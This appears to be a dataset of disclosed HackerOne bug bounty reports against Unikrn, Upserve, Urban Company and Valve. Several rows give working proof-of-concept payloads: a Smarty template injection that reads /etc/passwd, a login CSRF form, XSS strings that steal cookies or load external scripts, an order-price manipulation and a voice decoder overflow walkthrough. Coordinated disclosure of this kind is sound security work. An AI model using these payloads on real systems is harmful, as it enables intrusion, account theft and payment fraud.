To start, I began with the payload {7*7} and received a template error in the email I received Image F115749: ssti_rce_initial_payload_error.png 33.59 KiBZoom in Zoom out Copy Download Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by using {php}print ""Hello""{/php} {F115751}. Finally I used file_get_contents to begin extracting the etc/pass file {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php} Image F115752: ssti_rce_etc_passwd.png 23.59 KiBZoom in Zoom out Copy Download
Steps to reproduce

Edit your profile
Add the payload {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php} as your first name, last name and user name (I'm not sure which field is vulnerable)
Invite a friend using another email of yours
View the email and you will see part of the etc file dumped

Vulnerability
Since the {php} tags are being parsed and executed, we can execute php functions. In this case, you'll see I'm able to extract the etc/passwd file. While I haven't tried, an attacker can more than likely create a shell on the server.
Please let me know if you have any questions.
Pete2 attachments:F115749: ssti_rce_initial_payload_error.pngF115752: ssti_rce_etc_passwd.png",https://hackerone.com/reports/164224,Washington,United States,Bellevue,2016,8,29,17,27
Unikrn,11-50,0.0,1m-10m,$100.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF logs the victim into attacker's account,"albatraoz  submitted a report to Unikrn.Apr 17th (5 years ago)Description: There is no session validation while logging in which leads to csrf.
Steps To Reproduce:

Create a CSRF login POC using the following code.
Code 273 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""https://unikrn.com/apiv1/login"" method=""POST"">
4	  <input type=""hidden"" name=""usr"" value=""[email]"">
5	  <input type=""hidden"" name=""pwd"" value=""[password]"">
6      <input type=""submit"" value=""Submit request"" />
7    </form>
8  </body>
9</html>
10  

Replace the email and password with the valid credentials.
Send the script to the victim to make them click.

References:

You've rewarded a guy for login csrf here: https://hackerone.com/reports/293016
Impact of login csrf on a company: https://support.detectify.com/customer/portal/articles/1969819-login-csrf

Impact

Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password and can also monitor the victim activities. 
Also the victim may add his paymet info in the attackers account unknowingly using your wallet feature.

The hacker selected the Cross-Site Request Forgery (CSRF) weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
https://unikrn.com/apiv1/login
Verified
Yes
Can a victim be forced to perform a sensitive state-change operation unknowningly?
Yes
What state-change operation can be performed?
Any user details.",https://hackerone.com/reports/339352,Washington,United States,Bellevue,2018,4,17,4,2
Unikrn,11-50,0.0,1m-10m,$40.00,Medium,5.45,Cross-Site Request Forgery (CSRF),Flash CSRF: Update Ad Frequency %: [cp-ng.pinion.gg],"geekboy  submitted a report to Unikrn.Jul 21st (5 years ago)###Description:
Attacker can update the user's Ad Frequency % using flash + 307 redirect trick by making post request to particular endpoint.
###Step To Reproduce:

Get logged at: https://cp-ng.pinion.gg
Visit: http://geekboy.ninja/poc/freq.swf
Ad Frequency should be updated.

Note: for test i used my account with id ████, as update request use userid in endpoint, it can be modified as per need. 
{F205068}
Please let me know if any more info needed !

- Geekboy!Summary by geekboyFor readers: http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/Show more",https://hackerone.com/reports/251918,Washington,United States,Bellevue,2017,7,21,1,46
Unikrn,11-50,0.0,1m-10m,$300.00,Medium,5.45,Open Redirect,Open URL Redirection,"stark303  submitted a report to Unikrn.Jun 20th (about 1 year ago)Open URL Redirect  
Steps To Reproduce:
1) Go to the following link & Register for new account https://unikrn.com/██████
2) After registering It will redirect to example.com
Reference: https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
Impact
The attacker can force the user to install trojans, malwares, etc. into his system.
And also can steal cookies, conduct phishing attacks.",https://hackerone.com/reports/1238684,Washington,United States,Bellevue,2021,6,20,10,38
Unikrn,11-50,0.0,1m-10m,$40.00,Medium,5.45,Insufficient Session Expiration,Weak Session ID Implementation - No Session change on Password change,"cosmopolitan_fi  submitted a report to Unikrn.Sep 28th (5 years ago)Summary: [Weak session id implementation]
Description: [Unikrn does not change session id after password is changed. Reusing same session ids, after password is changed is highly risky.
Example scenario: Hacker has successfully brute forced the password of a victim and has access to the account. The victim notices that something's off and chooses to change the password of the account. Hacker has still full access to the account, even after the password is changed, because of the working session id that he got from the server when he logged in to the victim's account.]
Steps To Reproduce:
(Add details for how we can reproduce the issue)

[Intercept requests when logged in to unikrn and retrieve current session id]
[Change the password of the user]
[Do the step 1 again and compare the session id]

Supporting Material/References:
If necessary, check my Proof of Concept video.
https://drive.google.com/file/d/0B28KqsVY5jK6aVdTYzg5RTNMcGM/view",https://hackerone.com/reports/272839,Washington,United States,Bellevue,2017,9,28,21,50
Upserve ,101-250,0.0,10m-50m,$250.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,[theacademy.upserve.com] Reflected XSS Query-String,"bobrov  submitted a report to Upserve .Aug 2nd (4 years ago)Steps To Reproduce:
Open URL in FireFox:
Code 88 BytesWrap lines Copy Download1https://theacademy.upserve.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
HTTP Request
Code 100 BytesWrap lines Copy Download1GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
2Host: theacademy.upserve.com
HTTP Response
Code 441 BytesWrap lines Copy Download1<a class=""category dropdown-item name-sort sorting-desc"" href=""/roles/?""><script//src=data&colon;,alert(location)//&orderby=name&order=DESC"">Name</a>
2<a class=""category dropdown-item views-sort "" href=""/roles/?""><script//src=data&colon;,alert(location)//&orderby=views&order=DESC"" >Views</a>
3<a class=""category dropdown-item duration-sort "" href=""/roles/?""><script//src=data&colon;,alert(location)//&orderby=duration&order=DESC"">Duration</a>
Impact
Reflected XSS",https://hackerone.com/reports/389592,Rhode Island,United States,Providence,2018,8,2,11,35
Upserve ,101-250,0.0,10m-50m,"$1,500.00",High,7.95,Cross-site Scripting (XSS) - Stored,Ability to create own account UUID leads to stored XSS,"cache-money  submitted a report to Upserve .Jul 13th (5 years ago)I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an alert(1), because I think it could have been argued that the space was too small to actually do anything meaningful with.
This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.
PoC
Just replace the email with the one you own, and click the email confirmation link.
Code 439 BytesWrap lines Copy Download1POST /c/user HTTP/1.1
2Host: app.upserve.com
3Accept: application/json
4Accept-Language: en-US,en;q=0.5
5X-Requested-With: XMLHttpRequest
6Content-Type: application/x-www-form-urlencoded; charset=UTF-8
7Referer: https://app.upserve.com/settings/account
8Content-Length: 134
9Content-Type: text/plain;charset=UTF-8
10DNT: 1
11Connection: close
12
13uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
Live PoC
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002
The generated HTML looks like:
YUI.namespace('Env.DATA').consumer = {""uuid"":""</script><script src=//is.gd/z0i2sU>"",""firstName"":null,
Thanks,
-- Tanner",https://hackerone.com/reports/249131,Rhode Island,United States,Providence,2017,7,13,5,57
Upserve ,101-250,0.0,10m-50m,"$2,500.00",High,7.1,Cross-site Scripting (XSS) - DOM,DOM Based XSS via postMessage at https://inventory.upserve.com/login/,"gamer7112  submitted a report to Upserve .Jun 8th (3 years ago)Description
DOM based XSS is possible at https://inventory.upserve.com/login/ due to insecure origin checking when receiving a postMessage.
POC

Visit https://hq.upserve.com.████████/upserve_xss.html
Click link
View alert on https://inventory.upserve.com

Vulnerable Code
Code 439 BytesWrap lines Copy Download1window.addEventListener(""message"", function(e) {
2  if (~e.origin.indexOf(""https://hq.upserve.com"")) {
3    if (e.data && typeof e.data == ""object"") {
4      try {
5        if (e.data[""exec""]) {
6          eval(e.data[""exec""]);
7        }
8      } catch (err) {
9        console.log(err);
10      }
11    } else {
12      console.log(""Non-object passed"");
13    }
14  } else {
15    console.log(""Incorrect origin: "" + e.origin.toString());
16    return;
17  }
18});
The origin check simply determines if ""https://hq.upserve.com"" is anywhere in the origin so an origin like ""https://hq.upserve.com.mydomain.com"" will pass this check just fine.
Impact
Due to the page being a login page, login credentials could be logged and stolen when a victim goes to login.",https://hackerone.com/reports/603764,Rhode Island,United States,Providence,2019,6,8,2,0
Upserve ,101-250,0.0,10m-50m,"$1,200.00",Medium,5.0,Open Redirect,Open redirect at https://inventory.upserve.com/http://google.com/,"stankoja  submitted a report to Upserve .Dec 18th (4 years ago)The following URL is vulnerable to an open redirect (it will redirect to stanko.sh):
https://inventory.upserve.com/http://stanko.sh/
Impact
Users could get redirected to malicious domain.",https://hackerone.com/reports/469803,Rhode Island,United States,Providence,2018,12,18,22,35
Upserve ,101-250,0.0,10m-50m,"$3,500.00",Critical,9.5,Business Logic Errors,OLO Total price manipulation using negative quantities,"fuzz  submitted a report to Upserve .Jun 11th (4 years ago)Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.
In the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).
The total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.
Code 1.40 KiBWrap lines Copy Download1{""card_uuid"": ""09ef096d-18d7-4cb4-83b7-5bd15d310aac"", ""city"": ""Cambridge"", ""email"": ""mthompson@hexwave.com"", ""first_name"": ""Matt"", ""last_name"": ""Thompson"", ""line1"": ""1230 Massachusetts Ave"", ""order"": {""charges"": {""items"": [{""item_id"": ""254baa85-92c1-412e-a391-aaf44508d882"", ""name"": ""ChickenBurger"", ""price"": 1200, ""quantity"": 2, ""instructions"": """", ""total"": 1200, ""modifiers"": [], ""sides"": []}, {""item_id"": ""9169bfc1-2ee1-455b-ad65-aeadd36f46eb"", ""name"": ""BreadPudding"", ""price"": 900, ""quantity"": -1, ""instructions"": """", ""total"": 900, ""modifiers"": [], ""sides"": []}], ""taxes"": 290, ""tip"": {""amount"": 0}, ""total"": 1870}, ""confirmation_code"": ""upserve-hacker-cafe-32870"", ""fulfillment_info"": {""customer"": {""email"": ""mthompson@hexwave.com"", ""first_name"": ""Matt"", ""last_name"": ""Thompson"", ""phone"": ""555-555-5555""}, ""delivery_info"": {""address"": {""address_line1"": ""1230 Massachusetts Ave"", ""address_line2"": null, ""city"": ""Cambridge"", ""country"": """", ""state"": ""MA"", ""zip_code"": ""02138""}}, ""instructions"": """", ""type"": ""delivery""}, ""id"": ""a168f311-f0bf-416c-b813-b277e3a7b5b3"", ""payments"": {""payments"": [{""amount"": 0, ""payment_type"": ""CREDIT"", ""tip_amount"": 0}], ""total"": 3190}, ""time_placed"": ""2018-06-11T20:48:51.313Z""}, ""order_total"": 3190, ""phone_number"": ""555-555-5555"", ""state"": ""MA"", ""store_pretty_url"": ""upserve-lounge-test-providence-2"", ""submission_id"": ""a168f311-f0bf-416c-b813-b277e3a7b5b3"", ""text_alerts"": false, ""zip"": ""02138""}
Impact
The attacker can reduce the price of the order.2 attachments:F307763: Screen_Shot_2018-06-11_at_2.36.37_PM.pngF307764: Screen_Shot_2018-06-11_at_2.36.48_PM.png",https://hackerone.com/reports/364843,Rhode Island,United States,Providence,2018,6,11,22,2
Upserve ,101-250,0.0,10m-50m,"$1,000.00",Medium,5.0,Open Redirect,Open redirect on https://hq-api.upserve.com/,b3fa5e9aab949ed4574c10d  submitted a report to Upserve .Feb 18th (4 years ago),https://hackerone.com/reports/497664,Rhode Island,United States,Providence,2019,2,18,17,53
Upserve ,101-250,0.0,10m-50m,"$2,500.00",High,7.7,Business Logic Errors,Payment method token being sent to 3rd party analytics service,"ctulhu  submitted a report to Upserve .Jul 7th (3 years ago)Vulnerability Details:
Payment Tokens can be re-used to link the Credit Card to Another Users Account.
When Linking a Credit Card, a url with Payment_method_token will be generated and then the user will be redirected to the generated url
Image F523794: 60.png 132.88 KiBZoom in Zoom out Copy Download
Then, a Request will be Made to orders.upserve.com to Finally Link the Credit Card using the payment_method_token
Image F523795: 61.png 173.20 KiBZoom in Zoom out Copy Download
Reproduction Steps
1.) Create 2 Accounts on https://app.upserve.com/s/upserve-lounge-test-providence-2

juandelacruz@gmail.com
juandoe@gmail.com

2.) Add a Credit Card

4834422077410033|01|2023|730  - for juandelacruz@gmail.com
4834422073330870|06|2024|582 - juandoe@gmail.com

3.) While Adding the Credit Cards, Make sure to Capture all Request.
4.) Remove the Credit Card linked to the account of juandoe@gmail.com
5.) Using the payment_method_token of juandelacruz@gmail.com we will link his credit card to the account of juandoe@gmail.com
6.) Your Credit Card Will be linked to the account of juandoe@gmail.com.
I am Confused:

The last_four"":""3579"" is confusing me here, it doesnt really validate the last 4 digit it just accepts what ever is on the request, you can change it to any 4 digit numbers.
If you Added a MasterCard Credit Card, if the card_type is set to visa, it will show as a Visa Card.

Could you Please Verify on your Endpoint? 

""payment_method_token"":""a0543b88d2ddae5d2bd5f8fe""
ctulhu@wearehackerone.com

also
Important Details Such as Payment Method Tokens are shared thru 3rd Party Analytics. 
Image F523791: 58.png 105.02 KiBZoom in Zoom out Copy Download
Proof of Concept:
Video F523813: 1.mp4 10.30 MiBZoom in Zoom out Copy Download
Impact
If any attacker can access the 3rd party analytics account, they can get the payment method token of upserve users and use the tokens to link any credit cards to their account and cause a monetary impact to Upserve, a merchant, or a customer  ( creating a payment method they dont own)

Large Scale Fraud
4 attachments:F523791: 58.pngF523794: 60.pngF523795: 61.pngF523813: 1.mp4ctulhu   posted a comment. Jul 7th (3 years ago)The Generated Payment Method Token, should be only set for One Time Use Only.upserve-bryan   changed the scope from app.upserve.com to payments.upserve.com. Jul 8th (3 years ago)upserve-bryan   updated the severity from critical to high (7.7). Jul 8th (3 years ago)upserve-bryan   changed the status to Triaged. Jul 8th (3 years ago)Hi @ctulhu thank you for your report. The ability to reuse a payment method token is known and expected behavior. They can only be used for the restaurant that generated the token and this has been determined to be an acceptable risk. 
However, we were not intentionally sending them to the analytics provider, and that is the issue that we will take action on.upserve-bryan   changed the scope from payments.upserve.com to app.upserve.com. Jul 8th (3 years ago)ctulhu   posted a comment. Jul 8th (3 years ago)hey @upserve-bryan is it possible to change the title too?upserve-bryan   changed the report title from Add Another Users Credit Card to Your Account using payment_method_token to Payment method token being sent to 3rd party analytics service. Jul 9th (3 years ago)ctulhu   posted a comment. Jul 10th (3 years ago)Thanks, any updates on when will this be fixed?upserve-bryan   posted a comment. Jul 10th (3 years ago)@ctulhu release just went out moments ago if you want to validate itctulhu   posted a comment. Jul 10th (3 years ago)great! will check nowctulhu   posted a comment. Jul 10th (3 years ago)i verify that the Payment Tokens arent being sent anymore to the 3rd party analytics.
Thank you so much for the Fast Response and Fix.ctulhu   posted a comment. Jul 11th (3 years ago)once bounty is issued, can we limited disclose this? thanks!Upserve   rewarded ctulhu with a $2,500 bounty. Jul 11th (3 years ago)Thanks for your report @ctulhu! Happy hacking!upserve-bryan   closed the report and changed the status to Resolved. Jul 11th (3 years ago)Thanks again for your report @ctulhu. The fix has been released.ctulhu   requested to disclose this report. Jul 11th (3 years ago)Thank you so much for the bounty!, can we limited disclose this?ctulhu   cancelled the request to disclose this report. Jul 28th (3 years ago)change of mind. hope u understand. thanks!ctulhu   requested to disclose this report. Aug 4th (about 1 year ago)Requesting for limited disclosure  This report has been disclosed. Sep 3rd (about 1 year ago)",https://hackerone.com/reports/637267,Rhode Island,United States,Providence,2019,7,7,20,6
Upserve ,101-250,0.0,10m-50m,$250.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,Reflected xss on theacademy.upserve.com,"base_64  submitted a report to Upserve .Sep 27th (4 years ago)Vulnerabilty
Reflected xss in (https://theacademy.upserve.com).
STEPS TO REPRODUCE

Go to (https://theacademy.upserve.com/playlists/all-videos/).
Click on any video to watch from the playlist and capture the request in burp.
you have to capture the request to (https://theacademy.upserve.com/wp-admin/admin-ajax.php?action=load_player&video_id=5742677405001&player_id=B14h0D4OM&type=pc&post_id=2712)
then replace the video_id with this payload = r""><BODY%20ONLOAD=alert(1)>.
Then see the response in browser and the popup will appear.

NOTE: I also attached a video POC
Impact
With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.1 attachment:F351674: 20180926_165036_(2).mp4",https://hackerone.com/reports/415139,Rhode Island,United States,Providence,2018,9,27,0,21
Upserve ,101-250,0.0,10m-50m,$200.00,Low,2.0,Information Disclosure,reports.breadcrumb.com is vulnerable for Arbitrary file existence disclosur CVE-2014-7829,s3curityb3ast  submitted a report to Upserve .Mar 23rd (5 years ago),https://hackerone.com/reports/329218,Rhode Island,United States,Providence,2018,3,23,15,22
Upserve ,101-250,0.0,10m-50m,"$1,200.00",Medium,4.2,Cross-site Scripting (XSS) - Reflected,Reflected XSS on https://inventory.upserve.com/ (affects IE users only),"stealthy  submitted a report to Upserve .Dec 19th (4 years ago)Summary by stealthyThe value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE.
https://inventory.upserve.com/login/?'""--><script>confirm(document.cookie)</script>
Upserve handled this report quickly and professionally. I am looking forward to working with them again in the future.",https://hackerone.com/reports/469841,Rhode Island,United States,Providence,2018,12,19,2,50
Upserve ,101-250,0.0,10m-50m,"$3,500.00",Critical,9.5,Improper Access Control - Generic,Ability to reset password for account,exadmin  submitted a report to Upserve .Mar 6th (5 years ago),https://hackerone.com/reports/322985,Rhode Island,United States,Providence,2018,3,6,21,45
Upserve ,101-250,0.0,10m-50m,$500.00,High,7.95,Cross-site Scripting (XSS) - Stored,Blind stored xss in demo form,"paresh_parmar  submitted a report to Upserve .Mar 10th (5 years ago)Summary by paresh_parmar
Endpoint where i added payload  get a demo form. 
XSS executed in [redacted] company
In [redacted] company account , upserve  is using 3rd party tool which is use for marketing stuff,
so vulnerable app was 3rd party tool.  ( i also contact 3rd party, but no response from them) can't disclose name of tool because its use widely by many companies. 
a report was closed as informative by the triage team. they said they couldn't reproduce issue and also it's 3rd party site so its out of scope
I contact [redacted] company.  that company contact upserve and told them about issue, and finally they reopen this report ,and fixed it . (3rd party tool released fix )
Show more",https://hackerone.com/reports/324194,Rhode Island,United States,Providence,2018,3,10,11,53
Urban Company,1001-5000,0.0,No value,$50.00,Low,2.0,Violation of Secure Design Principles,Broken Link on Urban Company's Vulnerability Submission Form,"awararesearcher  submitted a report to Urban Company.Jun 21st (about 1 year ago)Summary:

Urban Company has an unclaimed broken link on their HackerOne security page which can be claimed by any malicious user. And then later the malicious user can exploit this issue to deceive new researchers to submit their legitimate findings to the wrong hands.

Steps To Reproduce:
1.Visit https://hackerone.com/urbancompany/reports/new?type=team&report_type=vulnerability
2.Click on Security Page.
3. The Security Page points to https://hackerone.com/urbanclap but the URL gives a 404.
4.So, I've impersonated your identity by forming a fake account named 'Security page takeover by awararesearcher' on that link. Here just for the PoC purpose, I've taken over that broken link by making an account with that username and added some context to show what impact can be made. Also, I'll surely release that username after your response.
Reference

https://edoverflow.com/2017/broken-link-hijacking

Impact

New researchers can be further deceived if they clicked on that hijacked link.
For Example a specific case might be: A malicious user can create a fake account on that broken redirection link and can deceive researchers arriving on that link. For example, the attacker can ask the researcher to submit his report to him first and if he approves, then only he can submit it to your official page. In this way, it can cause huge damage to your company if a report is critical in any case.
Here I've shown a sample impact by adding some info in that impersonated account.",https://hackerone.com/reports/1239334,No value,No value,No value,2021,6,21,7,3
Valve,251-500,0.0,100m-200m,"$2,500.00",High,8.0,Stack Overflow,[CS:GO] Unchecked texture file name with TEXTUREFLAGS_DEPTHRENDERTARGET can lead to Remote Code Execution,nyancat0131  submitted a report to Valve.Apr 29th (4 years ago),https://hackerone.com/reports/550625,Washington,United States,Bellevue,2019,4,29,17,52
Valve,251-500,0.0,100m-200m,$350.00,High,7.95,Classic Buffer Overflow,[GoldSrc] RCE via 'spk' Console Command,gamer7112  submitted a report to Valve.Jan 6th (3 years ago)mikela Valve staff  changed the status to Triaged. Jan 6th (3 years ago)Valve  rewarded gamer7112 with a $350 bounty. Jan 9th (3 years ago)mikela Valve staff  posted a comment. Aug 3rd (2 years ago)gamer7112   posted a comment. Aug 3rd (2 years ago)mikela Valve staff  posted a comment. Aug 19th (2 years ago)mikela Valve staff  closed the report and changed the status to Resolved. Aug 19th (2 years ago)gamer7112   requested to disclose this report. Aug 19th (2 years ago)mikela Valve staff  agreed to disclose this report. Aug 19th (2 years ago)  This report has been disclosed. Aug 19th (2 years ago),https://hackerone.com/reports/769014,Washington,United States,Bellevue,2020,1,6,20,39
Valve,251-500,0.0,100m-200m,$450.00,High,8.1,Classic Buffer Overflow,[GoldSrc] RCE via malformed BSP file,gamer7112  submitted a report to Valve.Dec 23rd (3 years ago),https://hackerone.com/reports/763403,Washington,United States,Bellevue,2019,12,23,5,19
Valve,251-500,0.0,100m-200m,"$2,500.00",High,7.95,Business Logic Errors,[help.steampowered.com] Account takeover bruteforcing SteamGuard,natetheriver  submitted a report to Valve.Sep 10th (4 years ago),https://hackerone.com/reports/407971,Washington,United States,Bellevue,2018,9,10,16,16
Valve,251-500,0.0,100m-200m,"$5,000.00",Critical,9.5,Classic Buffer Overflow,[Portal 2] Remote Code Execution via voice packets,gamer7112  submitted a report to Valve.Nov 9th (3 years ago),https://hackerone.com/reports/733267,Washington,United States,Bellevue,2019,11,9,23,41
Valve,251-500,0.0,100m-200m,"$1,500.00",High,7.95,Classic Buffer Overflow,[Half-Life 1] Malformed map name leads to memory corruption and code execution,kbeckmann  submitted a report to Valve.Aug 29th (4 years ago),https://hackerone.com/reports/402566,Washington,United States,Bellevue,2018,8,29,21,36
Valve,251-500,0.0,100m-200m,"$2,500.00",High,7.1,Improper Input Validation,[Source Engine] Material path truncation leads to Remote Code Execution,nyancat0131  submitted a report to Valve.Apr 20th (4 years ago),https://hackerone.com/reports/544096,Washington,United States,Bellevue,2019,4,20,12,18
Valve,251-500,0.0,100m-200m,$750.00,Medium,5.3,Write-what-where Condition,[steam client] Opening a specific steam:// url overwrites files at an arbitrary location,kbeckmann  submitted a report to Valve.Aug 4th (3 years ago),https://hackerone.com/reports/667242,Washington,United States,Bellevue,2019,8,4,21,24
Valve,251-500,0.0,100m-200m,$500.00,Medium,5.0,Information Disclosure,Aapp name leakage on economy history page,xpaw  submitted a report to Valve.May 10th (5 years ago),https://hackerone.com/reports/349681,Washington,United States,Bellevue,2018,5,10,6,10
Valve,251-500,0.0,100m-200m,"$9,000.00",Critical,9.5,Improper Access Control - Generic,Access to microtransaction sales data for lots of apps from 2014 to present at /valvefinance/sanity/,njbooher  submitted a report to Valve.Sep 5th (2 years ago),https://hackerone.com/reports/975212,Washington,United States,Bellevue,2020,9,5,12,52
Valve,251-500,0.0,100m-200m,"$2,500.00",High,7.95,Improper Access Control - Generic,"Add apps to packages 0, 61, 62 with /store/ajaxpackagemerge",njbooher  submitted a report to Valve.Sep 1st (2 years ago),https://hackerone.com/reports/972243,Washington,United States,Bellevue,2020,9,1,15,12
Valve,251-500,0.0,100m-200m,$750.00,Medium,5.3,Information Disclosure,ajaxgetachievementsforgame is not guarded for unreleased apps,utora  submitted a report to Valve.Mar 31st (3 years ago),https://hackerone.com/reports/835087,Washington,United States,Bellevue,2020,3,31,6,42
Valve,251-500,0.0,100m-200m,"$1,250.00",High,7.8,Privilege Escalation,Arbitrary File Write as SYSTEM from unprivileged user,b0yd  submitted a report to Valve.May 17th (4 years ago),https://hackerone.com/reports/583184,Washington,United States,Bellevue,2019,5,17,3,5
Valve,251-500,0.0,100m-200m,"$2,500.00",High,7.1,Information Disclosure,Big Picture web browser leaks login cookies and discloses sensitive information (may lead to account takeover),bugstar  submitted a report to Valve.Jan 15th (2 years ago),https://hackerone.com/reports/1079561,Washington,United States,Bellevue,2021,1,15,20,51
Valve,251-500,0.0,100m-200m,$750.00,Medium,5.45,Classic Buffer Overflow,Buffer overflows in demo parsing,yalter  submitted a report to Valve.May 10th (5 years ago),https://hackerone.com/reports/350119,Washington,United States,Bellevue,2018,5,10,17,39
Valve,251-500,0.0,100m-200m,"$1,150.00",High,8.1,Stack Overflow,Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser,irukandjisecresearch  submitted a report to Valve.Mar 27th (3 years ago),https://hackerone.com/reports/832750,Washington,United States,Bellevue,2020,3,27,13,7
Valve,251-500,0.0,100m-200m,"$7,500.00",Critical,9.1,Classic Buffer Overflow,Buffer overrun in Steam SILK voice decoder,"slidybat  submitted a report to Valve.Apr 29th (2 years ago)Vulnerability
The SteamWorks SDK has a function available named DecompressVoice(), which takes as input some compressed voice data, and returns the raw audio data.
The format for the input voice data is as follows:
Code 100 BytesWrap lines Copy Download18 bytes - steamid
21 byte - payload type
32 bytes - payload size
4<payload data>
54 bytes - CRC checksum
There are numerous payload types available, including Opus PLC, Opus, SILK, Raw and Silence. The bug being considered here is specific to the SILK decoder.
The pseudo-code for the SILK decoder is:
Code 1.49 KiBWrap lines Copy Download1unsigned int VoiceEncoder_SILK::Decode( const char* pPayloadData, size_t nPayloadSize, char* pDestBuffer, size_t nDestBufferSize )
2{
3	m_decControl.API_sampleRate = m_nSampleRate;
4	int nSamplesInFrame = 20 * m_nSampleRate / 1000;
5	int nBytesInFrame = 2 * nSamplesInFrame;
6	
7	const char* pPayloadCurr = pPayloadData;
8	const char* pPayloadEnd = pPayloadData + pPayloadSize;
9	
10	char* pDestCurr = pDestBuffer;
11	char* pDestEnd = pDestBuffer + nDestBufferSize;
12	
13	while ( pPayloadCurr < pPayloadEnd )
14	{
15		unsigned short nSize = *(short*)pPayloadCurr;
16		pPayloadCurr += 2;
17		if ( nSize == 0xFFFF )
18		{
19			return ( pDestCurr - pDestBuffer ) / 2;
20		}
21		
22		if ( nSize )
23		{
24			//  [1] Make sure we're not reading past end of our input
25			if ( pPayloadCurr + nSize > pPayloadEnd )
26				break;
27			
28			//  [2] Make sure we have enough room in output for a full frame
29			if ( pDestCurr + 2 * nBytesInFrame > pDestEnd )
30				break;
31			
32			// Zero out the frame
33			memset( pDestCurr, 0, nBytesInFrame );
34			
35			do
36			{
37				unsigned short nDecodedSamples = ( pDestCurr - pDestBuffer ) / 2;
38				SKP_Silk_SDK_Decode( m_pDecoder, &m_decControl, 0, pPayloadCurr, nSize, pDestCurr, &nDecodedSamples );
39				
40				pPayloadCurr += nSize;
41				pDestCurr += 2 * nDecodedSamples;
42				
43				Assert( m_decControl.moreInternalDecoderFrames == 0 ); // [3] We shouldn't get this condition in normal contexts
44			}
45			while ( m_decControl.moreInternalDecoderFrames );
46		}
47		else
48		{
49			pDestCurr += nBytesInFrame;
50		}
51	}
52	
53	return ( pDestCurr - pDestBuffer ) / 2;
54}
Some important things to note:

At [1], a bounds check is performed to ensure we don't read outside the bounds of the input buffer
At [2], a bounds check is performed to ensure we don't write outside the bounds of the output buffer
At [3], an assert is performed that m_decControl.moreInternalDecoderFrames == 0, however, without running with a debugger attached, this assertion is ignored.

The bug has to do with the do/while loop with m_decControl.moreInternalDecoderFrames. Inside the loop, pPayloadCurr and pDestCurr are both incremented, but the bounds checks at [1] and [2] aren't repeated.
This means that if m_decControl.moreInternalDecoderFrames is true, then we can increment pDestCurr past the end of the destination buffer, and overwrite stack data.
Exploiting the vulnerability
For the PoC, I chose to show this bug working in CS:GO, but any service that also uses the DecompressVoice function is also vulnerable. We can use this bug to crash Steam/CS:GO for any players on the server that our voices are transmitted to.
Note that the PoC simply overwrites the stack with garbage data which leads to a crash, however it is entirely possible for an attacker to overwrite the return pointer on the stack with meaningful data that results in RCE. Doing so requires quite a lot of setup work with the payload to get SILK to decode it to a valid ROP chain, so I simply went with the crash for an easier PoC.
One of the challenges to getting this working is to keep the payload size small. CS:GO has a rate-limit on voice data, so the entire voice packet must be kept under 512 bytes.
To accomplish this, we can build a voice payload that does this:

First, set nSize in the payload to 0 multiple times to get pDestCurr closer to pDestEnd (just over 1 frame away).
Next, trigger a call to SKP_Silk_SDK_Decode that also sets m_decControl.moreInternalDecoderFrames to true. At this point, pDestCurr will be incremented by 1 frame, and there will now be less than 1 frame of room in the dest buffer.
Trigger another call to SKP_Silk_SDK_Decode. Since m_decControl.moreInternalDecoderFrames is true, no bounds check is performed. This time there isn't enough room for a frame in the dest buffer and the decode function will overwrite the stack past pDestBuffer.

Attached is a compiled version of a public cheat (CSGOSimple) that adds a console command (send_voice_packet) to send the voice payloads from a file to the server.
A file that implements this payload is attached as voice_payload, which can be fed to the send_voice_packet command to replicate the PoC.
NOTE: Unrelated for replicating the PoC, but this payload is missing the SteamID/CRC data mentioned above. It is expected to be passed into CP2PVoiceSingleton::DecompressVoice() directly, or have the SteamID/CRC added before calling it.
Replication steps
1) Start CS:GO on device A with -insecure launch param and join a server (any empty vanilla server will do, I have one at s1.slidyb.at if needed).
2) Extract CSGOSimple.zip from the attachments onto device A and run injector.exe. Ensure that it has injected into the CS:GO process successfully by checking if the send_voice_packet command exists.
3) Start CS:GO on device B and join the same server.
4) Run send_voice_packet path\to\voice_payload in the CS:GO console on device A, where path\to\voice_payload is the absolute path to the voice_payload file without the C:. For example, if the file as at C:\Users\me\Desktop\voice_payload, then you would use the command send_voice_packet Users\me\Desktop\voice_payload.
5) Steam and CS:GO should both crash on device B.
Impact
